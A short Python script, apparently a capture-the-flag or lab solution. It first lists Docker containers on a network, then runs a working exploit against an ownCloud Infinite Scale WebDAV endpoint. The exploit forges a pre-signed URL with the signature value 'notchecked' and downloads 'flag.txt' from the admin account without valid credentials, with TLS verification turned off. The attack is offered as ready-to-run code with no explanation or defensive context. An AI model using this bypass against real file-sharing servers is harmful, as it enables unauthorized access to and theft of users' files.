import requests


import subprocess

def list_containers_on_network(network_name):
    try:
        # Run the docker command to list containers on the specified network
        result = subprocess.run(
            ["docker", "network", "inspect", network_name],
            capture_output=True,
            text=True,
            check=True
        )

        # Parse the output
        output = result.stdout
        print(f"Containers on network '{network_name}':\n{output}")

    except subprocess.CalledProcessError as e:
        print(f"Error: {e.stderr}")

if __name__ == "__main__":
    NETWORK_NAME = "shared_net"  # Change to your network name
    list_containers_on_network(NETWORK_NAME)



OCIS_URL = "ocis-app:9200"
USERNAME = "admin"
FILE = "flag.txt"
EXPLOIT_URL_TEMPLATE = "https://{}/remote.php/dav/files/{}/{}?OC-Credential={}&OC-Verb=GET&OC-Expires=60&OC-Date=2024-01-27T00:00:00.000Z&OC-Signature=notchecked"
EXPLOIT_URL = EXPLOIT_URL_TEMPLATE.format(OCIS_URL, USERNAME, FILE, USERNAME)

response = requests.get(EXPLOIT_URL, verify=False)

if response.status_code == 200:
    print(response.text)
else:
    print(f"Failed to download file: {response.status_code}")
